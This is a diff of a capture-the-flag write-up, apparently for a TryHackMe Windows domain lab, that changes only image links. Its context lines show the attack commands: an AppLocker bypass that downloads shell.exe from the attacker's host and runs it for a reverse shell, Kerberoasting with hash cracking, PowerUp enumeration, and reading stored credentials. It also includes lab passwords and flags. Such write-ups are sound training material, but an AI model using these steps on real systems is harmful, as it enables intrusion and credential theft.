@@ -32,7 +32,7 @@ You will have noticed that with the deployed machine, you cannot execute your bi
 
 We need to answer this:
 
-![[Pasted image 20250531150543.png]]
+![](../images/Pasted%20image%2020250531150543.png)
 
 We are told we can bypass the `applocker` restriction by dropping a file inside of 
 
@@ -63,7 +63,7 @@ We need to connect to RDP, we can use:
 xfreerdp /u:corp\\dark /p:_QuejVudId6 /v:10.10.253.99 /size:1440x1080 +clipboard +fonts /cert:ignore
 ```
 
-![[Pasted image 20250531151311.png]]
+![](../images/Pasted%20image%2020250531151311.png)
 
 On here, let's host the python server and use Powershell to download the file into the whitelisted path:
 
@@ -71,7 +71,7 @@ On here, let's host the python server and use Powershell to download the file in
 Invoke-WebRequest -Uri http://10.14.21.28:8000/shell.exe -OutFile C:/Windows/System32/spool/drivers/color/shell.exe
 ```
 
-![[Pasted image 20250531151710.png]]
+![](../images/Pasted%20image%2020250531151710.png)
 
 We can see the request was successful, now, we can execute the file and receive a shell in our listener:
 
@@ -89,7 +89,7 @@ Now, for the flag, we can use:
 Get-Content C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
-![[Pasted image 20250531152244.png]]
+![](../images/Pasted%20image%2020250531152244.png)
 
 Got our flag:
 
@@ -113,7 +113,7 @@ Kerberos is the authentication system for Windows and Active Directory networks.
 ## Practical
 ---
 
-![[Pasted image 20250531152426.png]]
+![](../images/Pasted%20image%2020250531152426.png)
 
 Nice, we need to do the following:
 
@@ -121,7 +121,7 @@ Nice, we need to do the following:
 setspn -T medin -Q */*
 ```
 
-![[Pasted image 20250531152549.png]]
+![](../images/Pasted%20image%2020250531152549.png)
 
 We now need to download the `Invoke-Kerberoast.ps1` script, for this, download it on our host machine and host it as before:
 
@@ -135,11 +135,11 @@ Once you start the python server, do:
 Invoke-WebRequest -Uri http://10.14.21.28:8000/Invoke-Kerberoast.ps1 -OutFile Invoke-Kerberoast.ps1
 ```
 
-![[Pasted image 20250531152834.png]]
+![](../images/Pasted%20image%2020250531152834.png)
 
 We'll see the request on our server, also, the file is now on our directory we downloaded it:
 
-![[Pasted image 20250531152908.png]]
+![](../images/Pasted%20image%2020250531152908.png)
 
 Let's use it:
 
@@ -148,7 +148,7 @@ Let's use it:
 Invoke-Kerberoast -OutputFormat hashcat |fl
 ```
 
-![[Pasted image 20250531153500.png]]
+![](../images/Pasted%20image%2020250531153500.png)
 
 There we go, we got our `TGS`, let's use hashcat to crack it:
 
@@ -180,17 +180,17 @@ We need to use `rdp` again:
 xfreerdp /u:corp\\fela /p:"rubenF124" /v:10.10.253.99 /size:1440x1080 +clipboard +auto-reconnect /cert:ignore
 ```
 
-![[Pasted image 20250531154205.png]]
+![](../images/Pasted%20image%2020250531154205.png)
 
 We can see our flag:
 
-![[Pasted image 20250531154311.png]]
+![](../images/Pasted%20image%2020250531154311.png)
 
 ```
 flag{bde1642535aa396d2439d86fe54a36e4}
 ```
 
-![[Pasted image 20250531154304.png]]
+![](../images/Pasted%20image%2020250531154304.png)
 
 
 # Privilege Escalation
@@ -204,7 +204,7 @@ We will use a PowerShell enumeration script to examine the Windows machine. We c
 ## Practical
 ----
 
-![[Pasted image 20250531160234.png]]
+![](../images/Pasted%20image%2020250531160234.png)
 
 Same procedure as the last task:
 
@@ -216,7 +216,7 @@ Invoke-WebRequest -Uri http://10.14.21.28:8000/PowerUp.ps1 -OutFile PowerUp.ps1
 We can now read `unattended.xml`:
 
 
-![[Pasted image 20250531160740.png]]
+![](../images/Pasted%20image%2020250531160740.png)
 
 We got this hash:
 
@@ -236,19 +236,19 @@ We got it, let's go into rdp and get our flag:
 xfreerdp /u:Administrator /p:"tqjJpEX9Qv8ybKI3yHcc=L\!5e(\!wW;\$T" /v:10.10.253.99 /size:1440x1080 +clipboard +auto-reconnect /cert:ignore
 ```
 
-![[Pasted image 20250531161032.png]]
+![](../images/Pasted%20image%2020250531161032.png)
 
 We need to change password, change it to anything.
 
-![[Pasted image 20250531161948.png]]
+![](../images/Pasted%20image%2020250531161948.png)
 
 Now, we can read our flag:
 
-![[Pasted image 20250531162002.png]]
+![](../images/Pasted%20image%2020250531162002.png)
 
 ```
 THM{g00d_j0b_SYS4DM1n_M4s73R}
 ```
 
-![[Pasted image 20250531162040.png]]
+![](../images/Pasted%20image%2020250531162040.png)
 
